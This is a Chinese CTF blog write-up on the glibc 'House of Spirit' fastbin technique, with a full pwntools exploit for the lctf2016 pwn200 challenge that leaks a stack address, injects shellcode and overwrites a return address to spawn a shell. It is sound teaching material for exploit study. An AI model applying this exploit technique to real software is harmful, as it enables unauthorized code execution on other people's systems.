---
title: 「PWN」House_of_Spirit
description: 本文向读者介绍了计算机安全领域中的一种利用技术：`House_of_spirit`，作者nova详细解析了这种技术如何通过在栈上构造伪造块（fake_chunk）来实现近乎任意的写入操作。关键点在于需要满足16字节对齐要求，以及伪造的下一个块的大小（next_fake_chunk
  size）来绕过检验。
pubDate: 2022-07-19
tags:
- CTF
- Pwn
authors:
- nova
---

看看`House_of_spirit`，这是一种依靠在栈上构造`fake_chunk`从而实现`(almost) arbitrary write`的技术。依赖`fastbin`

<!--truncate-->

# how2heap

整体还是比较简单的，需要注意的就是需要`16字节对齐`，且需要构造`next_fake_chunk`的`chunk_size`以绕过检查

![image-20220719220643524](https://oss.nova.gal/img/image-20220719220643524.png)

![image-20220719220923354](https://oss.nova.gal/img/image-20220719220923354.png)

# 实战

## lctf2016_pwn200

![checksec](https://oss.nova.gal/img/image-20220719235857110.png)

保护啥也没开，想着就是直接`ret2shellcode`梭哈，但是没有那么多字节给我们栈溢出。

![400A8E](https://oss.nova.gal/img/image-20220719235308594.png)

第一个`who are u?`的函数存在`Off-by-One`的漏洞，可以泄露出`400A8E`的`rbp`指向的内容（也就是父函数的`rbp`）

```python
def who_are_you(content: bytes) -> bytes:
    sh.sendafter(b'who are u?\n', content)
    sh.recv(0x30)
    return sh.recv(6).ljust(8, b'\x00')

rbp = u64(who_are_you(b'a'*0x30))
print("> rbp:", hex(rbp))
```

![RBP](https://oss.nova.gal/img/image-20220719235609346.png)

函数`read_input()`返回了一个`int`，虽然`400A8E`没有使用，他也应该会存到栈上的某个位置，根据汇编得到其位于`[rbp-0x38]`的位置

![[rbp-0x38]](https://oss.nova.gal/img/image-20220720000140408.png)

在`400A29`中，可以看出`dest`是指针，`buf`存在`8`字节的溢出，正好可以覆盖`dest`，而`dest`会存到`ptr`中，供之后的`menu`里的功能来`free`和`malloc`等。

![400A29](https://oss.nova.gal/img/image-20220720000329530.png)

到此，我们可以初步猜想，可以在`buf`这里构造一个`fake_chunk`，然后把堆指针指向`buf`，这样我们就有了一个在栈上的`chunk`。问题是在`check_out`函数中，想要`free(ptr)`，我们必须依靠`House_of_spirit`伪造`fake_next_chunk_size`

根据计算，我们可以发现刚才的`id`正位于目前我们`buf+0x68`的位置，因此我们不妨造一个`0x50`大小的`chunk`，并把`id`设置成一个满足`house_of_spirit`的值。

![fake_next_chunk_size](https://oss.nova.gal/img/image-20220720001354338.png)

如此一来，当我们执行`free(ptr)`时，便会将这个栈上的地址存到`fastbin`中，此时我们重新`malloc(0x60)`，并写入对应的`payload`更改返回地址，便可以拿到`shell`了

通过观察，我们可以发现唯一可以控制的`ret_addr`是`ptr+0x40`的这个。返回地址可控了，丢到哪里呢？还记得我们一开始`who_r_u`的时候输入了`0x30`的数据么？我们完全可以把`shellcode`写到这里。只要计算一下偏移就可以了。

![image-20220720002739429](https://oss.nova.gal/img/image-20220720002739429.png)

完整 EXP:

```python
from pwn import *
context(os='linux', arch='amd64', log_level='DEBUG')

sh = process(['./pwn200'])


def who_are_you(content: bytes) -> bytes:
    sh.sendafter(b'who are u?\n', content)
    sh.recv(0x30)
    return sh.recv(6).ljust(8, b'\x00')


def give_id(content: bytes):
    sh.sendafter(b'give me your id ~~?', content)


def give_money(content: bytes):
    sh.sendafter(b'give me money~', content)


def menu(index: int):
    sh.recvuntil(b"your choice : ")
    if index == 1:
        sh.sendline(b"1")
    elif index == 2:
        sh.sendline(b"2")
        sh.recvuntil(b"out~")
    elif index == 3:
        sh.sendline(b"3")
        sh.recvuntil(b'good bye~')


def check_in(length_: bytes, content: bytes):
    sh.sendlineafter(b'how long?', length_)
    sh.sendlineafter(length_ + b'\n', content)
    sh.recvuntil(b"in~")


def gdb_(time_: int = None, arg: str = None):
    gdb.attach(sh, arg)
    pause(time_)


rbp = u64(who_are_you(asm(shellcraft.sh()).ljust(0x30, b'\x00')))
# rbp = u64(who_are_you(b'a'*0x30))
print("> rbp:", hex(rbp))
give_id(b'2333')  # next_fake_chunk_size
payload = p64(0) + p64(0x60) + b'\x00'*(0x40-0x10-0x08) + p64(rbp-0xb0)
give_money(payload)

menu(2)
ret_addr = rbp - 0x50
payload = b'\x00'*0x38 + p64(ret_addr) + b'\x00'*0x0F
menu(1)
check_in(b'80', payload)
menu(3)
sh.interactive()

```

# 2014_hack.lu_oreo

哈哈哥们出了个整不明白的 bug（`pwntools`接不到`Action`），后面再说吧，乐

![image-20220720204517147](https://oss.nova.gal/img/image-20220720204517147.png)
